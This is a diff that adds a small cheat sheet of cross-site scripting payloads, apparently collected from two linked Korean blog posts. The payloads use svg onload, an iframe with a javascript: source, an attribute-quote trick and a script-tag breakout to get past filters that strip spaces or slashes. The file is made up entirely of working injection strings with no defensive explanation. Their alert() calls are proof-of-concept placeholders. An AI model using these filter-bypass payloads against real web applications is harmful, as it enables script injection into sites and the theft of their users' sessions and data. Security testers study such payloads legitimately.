@@ -1,0 +1,18 @@
+<svg/onload=alert(111)> 
+<iframe/src=javascript:alert(111)>
+<svg/test=""onload=alert(111)>
+a='\\'; alert(1); </script> <!--
+
+
+
+
+
+
+
+
+
+
+
+출처 및 참고사이트
+https://www.hahwul.com/2017/02/20/web-hacking-bypass-xss-blank-filtering/
+https://www.hahwul.com/2019/08/16/bypass-blankslash-filter-for-xss-to-simple-trick/
